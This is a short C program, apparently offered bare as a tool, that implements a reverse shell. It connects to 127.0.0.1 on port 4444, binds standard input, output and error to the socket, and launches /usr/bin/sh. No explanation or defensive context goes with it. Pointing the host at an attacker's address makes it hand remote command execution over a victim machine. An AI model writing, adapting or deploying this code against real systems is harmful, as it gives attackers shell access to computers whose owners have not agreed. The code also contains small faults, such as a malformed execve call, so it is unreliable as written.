#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#define HOST_ADDR "127.0.0.1"

int main(void) {

    int sock_u;
    int connc_server;
    struct sockaddr_in r_server;

    sock_u = socket(AF_INET, SOCK_STREAM, 0);

    r_server.sin_family = AF_INET;
    r_server.sin_port = htons(4444);
    r_server.sin_addr.s_addr = inet_addr(HOST_ADDR);


    connc_server = connect(sock_u, (struct sockaddr * )&r_server, sizeof r_server);

    if (connc_server == 0) {
        dup2(sock_u, 0);
        dup2(sock_u, 1);
        dup2(sock_u, 2);
        execve("/usr/bin/sh", NULL);
    } else {
        printf("\n\n\tError");
        close(sock_u);
        close(connc_server);
    }
}
